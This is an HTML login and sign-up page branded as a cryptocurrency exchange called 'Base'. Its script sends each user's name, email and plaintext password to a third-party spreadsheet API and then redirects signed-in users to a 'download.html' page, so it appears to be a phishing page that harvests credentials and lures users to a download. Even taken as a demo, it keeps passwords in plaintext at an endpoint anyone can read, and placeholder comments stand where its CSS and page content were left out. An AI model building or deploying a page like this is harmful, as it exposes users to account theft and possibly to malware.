<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Base - Buy & Sell Bitcoin, Ethereum, and more with trust</title>
    <style>
        /* ... (keep your original CSS from your last message) ... */
        /* For brevity, keep all your previous CSS unchanged */
        /* (Paste your last version of CSS here, unchanged for brevity) */
        /* ... */
    </style>
</head>
<body>
    <!-- Header and page content (unchanged) ... -->

    <!-- ... Everything from <header> to <footer> remains the same ... -->

    <!-- SIGN IN MODAL -->
    <div class="modal-overlay" id="signInModal">
        <div class="modal">
            <button class="go-back-home" id="goBackHome" title="Go back to Homepage">&larr; Home</button>
            <button class="modal-close" id="closeSignInModal" title="Close">&times;</button>
            <h2>Sign in to Base</h2>
            <form id="signInForm" autocomplete="off">
                <div>
                    <label for="signin-email">Email address</label>
                    <input type="email" id="signin-email" name="email" required placeholder="your@email.com" />
                    <div id="emailError" class="error-message"></div>
                </div>
                <div>
                    <label for="signin-password">Password</label>
                    <input type="password" id="signin-password" name="password" required minlength="8" placeholder="Password" />
                    <div id="passwordError" class="error-message"></div>
                </div>
                <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
                <div id="signInSuccess" style="color: #10b981; text-align:center; margin-top:10px; display:none;"></div>
                <div id="signInFail" style="color: #e11d48; text-align:center; margin-top:10px; display:none;"></div>
                <a href="#" class="forgot-link" onclick="alert('Forgot password coming soon!')">Forgot your password?</a>
                <a href="#" class="signup-link" id="openSignUpModal">Don't have an account? Sign up</a>
            </form>
        </div>
    </div>

    <!-- SIGN UP MODAL -->
    <div class="modal-overlay" id="signUpModal">
        <div class="modal">
            <button class="go-back-home" id="goBackHomeSignUp" title="Go back to Homepage">&larr; Home</button>
            <button class="modal-close" id="closeSignUpModal" title="Close">&times;</button>
            <h2>Create your account</h2>
            <form id="signUpForm" autocomplete="off">
                <div>
                    <label for="signup-firstname">First name</label>
                    <input type="text" id="signup-firstname" name="firstname" required placeholder="Enter your first name" />
                    <div id="firstnameError" class="error-message"></div>
                </div>
                <div>
                    <label for="signup-lastname">Last name</label>
                    <input type="text" id="signup-lastname" name="lastname" required placeholder="Enter your last name" />
                    <div id="lastnameError" class="error-message"></div>
                </div>
                <div>
                    <label for="signup-email">Email address</label>
                    <input type="email" id="signup-email" name="email" required placeholder="your@email.com" />
                    <div id="signupEmailError" class="error-message"></div>
                </div>
                <div>
                    <label for="signup-password">Password</label>
                    <input type="password" id="signup-password" name="password" required minlength="8" placeholder="Create a password (8+ characters)" />
                    <div id="signupPasswordError" class="error-message"></div>
                </div>
                <div>
                    <label for="signup-confirm-password">Confirm password</label>
                    <input type="password" id="signup-confirm-password" name="confirmPassword" required minlength="8" placeholder="Confirm your password" />
                    <div id="confirmPasswordError" class="error-message"></div>
                </div>
                <button type="submit" class="btn btn-primary" id="signUpBtn">Create account</button>
                <div id="signUpSuccess" style="color: #10b981; text-align:center; margin-top:10px; display:none;"></div>
                <div id="signUpFail" style="color: #e11d48; text-align:center; margin-top:10px; display:none;"></div>
                <a href="#" class="signup-link" id="openSignInModal2">Already have an account? Sign in</a>
            </form>
        </div>
    </div>

<script>
    // Mobile menu toggle
    // ... (Unchanged menu logic) ...

    // Modal triggers
    const openModalBtn = document.getElementById('openSignInModal');
    const openModalBtnMobile = document.getElementById('openSignInModalMobile');
    const closeModalBtn = document.getElementById('closeSignInModal');
    const modalOverlay = document.getElementById('signInModal');
    const signInForm = document.getElementById('signInForm');
    const emailInput = document.getElementById('signin-email');
    const passwordInput = document.getElementById('signin-password');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const goBackHomeBtn = document.getElementById('goBackHome');
    const signInBtn = document.getElementById('signInBtn');
    const signInSuccess = document.getElementById('signInSuccess');
    const signInFail = document.getElementById('signInFail');
    const signUpModal = document.getElementById('signUpModal');
    const openSignUpModalBtn = document.getElementById('openSignUpModal');
    const closeSignUpModalBtn = document.getElementById('closeSignUpModal');
    const goBackHomeSignUpBtn = document.getElementById('goBackHomeSignUp');
    const signUpForm = document.getElementById('signUpForm');
    const openSignInModal2Btn = document.getElementById('openSignInModal2');
    // Show sign in modal (desktop)
    openModalBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modalOverlay.classList.add('active');
        emailInput.focus();
    });
    // Show sign in modal (mobile)
    openModalBtnMobile.addEventListener('click', (e) => {
        e.preventDefault();
        navLinks.classList.remove('active');
        modalOverlay.classList.add('active');
        emailInput.focus();
    });
    // Show sign up modal from sign in modal
    openSignUpModalBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modalOverlay.classList.remove('active');
        signUpModal.classList.add('active');
        document.getElementById('signup-firstname').focus();
    });
    // Show sign in modal from sign up modal
    openSignInModal2Btn.addEventListener('click', (e) => {
        e.preventDefault();
        signUpModal.classList.remove('active');
        modalOverlay.classList.add('active');
        emailInput.focus();
    });
    // Close sign in modal (X button)
    closeModalBtn.addEventListener('click', () => {
        modalOverlay.classList.remove('active');
        signInForm.reset();
        emailError.textContent = "";
        passwordError.textContent = "";
        signInSuccess.style.display = "none";
        signInFail.style.display = "none";
    });
    // Close sign up modal (X button)
    closeSignUpModalBtn.addEventListener('click', () => {
        signUpModal.classList.remove('active');
        signUpForm.reset();
        clearSignUpErrors();
    });
    // Close sign in modal (Go Back Home button)
    goBackHomeBtn.addEventListener('click', function(e) {
        e.preventDefault();
        modalOverlay.classList.remove('active');
        signInForm.reset();
        emailError.textContent = "";
        passwordError.textContent = "";
        signInSuccess.style.display = "none";
        signInFail.style.display = "none";
    });
    // Close sign up modal (Go Back Home button)
    goBackHomeSignUpBtn.addEventListener('click', function(e) {
        e.preventDefault();
        signUpModal.classList.remove('active');
        signUpForm.reset();
        clearSignUpErrors();
    });
    // Click outside modal closes sign in modal
    modalOverlay.addEventListener('click', function(e) {
        if (e.target === modalOverlay) {
            modalOverlay.classList.remove('active');
            signInForm.reset();
            emailError.textContent = "";
            passwordError.textContent = "";
            signInSuccess.style.display = "none";
            signInFail.style.display = "none";
        }
    });
    // Click outside modal closes sign up modal
    signUpModal.addEventListener('click', function(e) {
        if (e.target === signUpModal) {
            signUpModal.classList.remove('active');
            signUpForm.reset();
            clearSignUpErrors();
        }
    });
    // ESC key closes modals
    window.addEventListener('keydown', function(e) {
        if (e.key === "Escape") {
            if (modalOverlay.classList.contains('active')) {
                modalOverlay.classList.remove('active');
                signInForm.reset();
                emailError.textContent = "";
                passwordError.textContent = "";
                signInSuccess.style.display = "none";
                signInFail.style.display = "none";
            }
            if (signUpModal.classList.contains('active')) {
                signUpModal.classList.remove('active');
                signUpForm.reset();
                clearSignUpErrors();
            }
        }
    });
    function clearSignUpErrors() {
        document.getElementById('firstnameError').textContent = "";
        document.getElementById('lastnameError').textContent = "";
        document.getElementById('signupEmailError').textContent = "";
        document.getElementById('signupPasswordError').textContent = "";
        document.getElementById('confirmPasswordError').textContent = "";
        document.getElementById('signUpSuccess').style.display = "none";
        document.getElementById('signUpFail').style.display = "none";
    }

    // --- SIGN UP FORM VALIDATION + SHEETDB ---
    signUpForm.addEventListener('submit', function(e) {
        e.preventDefault();
        let hasError = false;
        clearSignUpErrors();

        const firstnameInput = document.getElementById('signup-firstname');
        const lastnameInput = document.getElementById('signup-lastname');
        const signupEmailInput = document.getElementById('signup-email');
        const signupPasswordInput = document.getElementById('signup-password');
        const confirmPasswordInput = document.getElementById('signup-confirm-password');
        const signUpBtn = document.getElementById('signUpBtn');

        // Validation
        if (!firstnameInput.value.trim()) {
            document.getElementById('firstnameError').textContent = "First name is required";
            hasError = true;
        }
        if (!lastnameInput.value.trim()) {
            document.getElementById('lastnameError').textContent = "Last name is required";
            hasError = true;
        }
        if (!signupEmailInput.value) {
            document.getElementById('signupEmailError').textContent = "Email is required";
            hasError = true;
        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(signupEmailInput.value)) {
            document.getElementById('signupEmailError').textContent = "Enter a valid email address";
            hasError = true;
        }
        if (!signupPasswordInput.value) {
            document.getElementById('signupPasswordError').textContent = "Password is required";
            hasError = true;
        } else if (signupPasswordInput.value.length < 8) {
            document.getElementById('signupPasswordError').textContent = "Password must be at least 8 characters";
            hasError = true;
        }
        if (!confirmPasswordInput.value) {
            document.getElementById('confirmPasswordError').textContent = "Please confirm your password";
            hasError = true;
        } else if (signupPasswordInput.value !== confirmPasswordInput.value) {
            document.getElementById('confirmPasswordError').textContent = "Passwords do not match";
            hasError = true;
        }

        if (hasError) return;

        signUpBtn.textContent = "Creating account...";
        signUpBtn.disabled = true;

        // Check for existing email before creating account
        fetch('https://sheetdb.io/api/v1/sbath1xpp3h1u/search?email=' + encodeURIComponent(signupEmailInput.value))
        .then(response => response.json())
        .then(data => {
            if (data.length > 0) {
                document.getElementById('signupEmailError').textContent = "Email already exists!";
                signUpBtn.textContent = "Create account";
                signUpBtn.disabled = false;
            } else {
                // Now post to SheetDB
                const payload = {
                    data: [{
                        firstname: firstnameInput.value.trim(),
                        lastname: lastnameInput.value.trim(),
                        email: signupEmailInput.value.trim(),
                        password: signupPasswordInput.value
                    }]
                };
                fetch('https://sheetdb.io/api/v1/sbath1xpp3h1u', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        document.getElementById('signUpSuccess').textContent = "Account created successfully!";
                        document.getElementById('signUpSuccess').style.display = "block";
                        document.getElementById('signUpFail').style.display = "none";
                        setTimeout(() => {
                            signUpModal.classList.remove('active');
                            signUpForm.reset();
                            clearSignUpErrors();
                            modalOverlay.classList.add('active');
                            emailInput.focus();
                        }, 1800);
                    } else {
                        throw new Error('Signup failed');
                    }
                })
                .catch(() => {
                    document.getElementById('signUpFail').textContent = "Error creating account. Try again.";
                    document.getElementById('signUpFail').style.display = "block";
                })
                .finally(() => {
                    signUpBtn.textContent = "Create account";
                    signUpBtn.disabled = false;
                });
            }
        })
        .catch(() => {
            document.getElementById('signupEmailError').textContent = "Error checking email. Try again.";
            signUpBtn.textContent = "Create account";
            signUpBtn.disabled = false;
        });
    });

    // --- SIGN IN FORM (checks SheetDB, redirects to download.html if valid) ---
    signInForm.addEventListener('submit', function(e) {
        e.preventDefault();
        emailError.textContent = "";
        passwordError.textContent = "";
        signInSuccess.style.display = "none";
        signInFail.style.display = "none";
        signInBtn.textContent = "Signing in...";
        signInBtn.disabled = true;

        let hasError = false;
        if (!emailInput.value) {
            emailError.textContent = "Email is required";
            hasError = true;
        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
            emailError.textContent = "Enter a valid email address";
            hasError = true;
        }
        if (!passwordInput.value) {
            passwordError.textContent = "Password is required";
            hasError = true;
        } else if (passwordInput.value.length < 8) {
            passwordError.textContent = "Password must be at least 8 characters";
            hasError = true;
        }
        if (hasError) {
            signInBtn.textContent = "Sign in";
            signInBtn.disabled = false;
            return;
        }
        // Check credentials in SheetDB
        fetch('https://sheetdb.io/api/v1/sbath1xpp3h1u/search?email=' + encodeURIComponent(emailInput.value))
        .then(response => response.json())
        .then(data => {
            if (data.length > 0 && data[0].password === passwordInput.value) {
                signInSuccess.textContent = "Sign in successful!";
                signInSuccess.style.display = "block";
                signInFail.style.display = "none";
                setTimeout(() => {
                    window.location.href = "download.html";
                }, 1200);
            } else {
                signInFail.textContent = "Invalid email or password.";
                signInFail.style.display = "block";
            }
        })
        .catch(() => {
            signInFail.textContent = "Sign in failed. Please try again.";
            signInFail.style.display = "block";
        })
        .finally(() => {
            signInBtn.textContent = "Sign in";
            signInBtn.disabled = false;
        });
    });
</script>
</body>
</html>
